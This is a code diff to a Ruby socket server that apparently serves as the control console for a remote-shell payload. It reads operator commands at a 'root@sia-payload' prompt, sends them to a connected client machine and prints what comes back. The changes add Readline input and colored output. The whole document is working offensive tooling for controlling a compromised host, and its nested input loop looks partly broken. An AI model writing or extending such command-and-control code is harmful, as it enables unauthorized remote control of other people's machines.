@@ -3,12 +3,19 @@
 require "socket"
 require "colorize"
 require "timeout"
+require "readline"
+
+#######   TEXT COLOR #######
 
 RS="\033[0m"    # reset
 HC="\033[1m"    # hicolor
 FRED="\033[31m" # foreground red
 FGRN="\033[32m" # foreground green
 FWHT="\033[37m" # foreground white
+PURPLE = "\e[35m"
+DARK_BLUE = "\e[34m"
+BOLD = "\e[1m" # bold text
+RED = "\e[1m\e[31m"
 
 if RUBY_PLATFORM =~ /win32/
   system("cls")
@@ -56,31 +63,34 @@ loop {                          # Servers run forever
       #if client is disconnected show this message
       puts "#{HC}#{FRED}[*] Client is Offline!#{RS}" if client.closed?
 
-      print "\n[+] Enter Command : ".blue
-      com = gets.chomp
-      client.puts(com)
-      
-      puts "\n+------------------------------------------------------------+"
-      #res = client.recv(10000).red
-      begin
-        Timeout::timeout(5) do
-          res = client.recv(1000).red
-          if res == ""
-            print "\n[+] Enter Command : ".blue
-            com = gets.chomp
-            client.puts(com)
-          #else
-          else
-            puts res
-          end
-          puts "+------------------------------------------------------------+\n"
-        end
+      #print "\n[+] Enter Command : ".blue
+      #com = gets.chomp
+      #client.puts(com)
 
-      rescue Timeout::Error
-        #print "\n[+] Enter Command : ".blue
-        #com = gets.chomp
-        #client.puts(com)
+      while com = Readline.readline("\n#{BOLD}[+] #{PURPLE}root@sia-payload#{DARK_BLUE}:~# #{RS}", true)
+        client.puts(com)
+        puts "\n+------------------------------------------------------------+"
+        #res = client.recv(10000).red
+        begin
+          Timeout::timeout(5) do
+            res = client.recv(1000).red
+            if res == ""
+              while com = Readline.readline("\n#{BOLD}[+] #{PURPLE}root@sia-payload#{DARK_BLUE}:~# #{RS}", true)
+                client.puts(com)
+              end
+            #else
+            else
+              puts res
+            end
+            puts "+------------------------------------------------------------+"
+          end
+
+        rescue Timeout::Error
+          #print "\n[+] Enter Command : ".blue
+          #com = gets.chomp
+          #client.puts(com)
+        end
       end
     end
-  end
+      end
 }
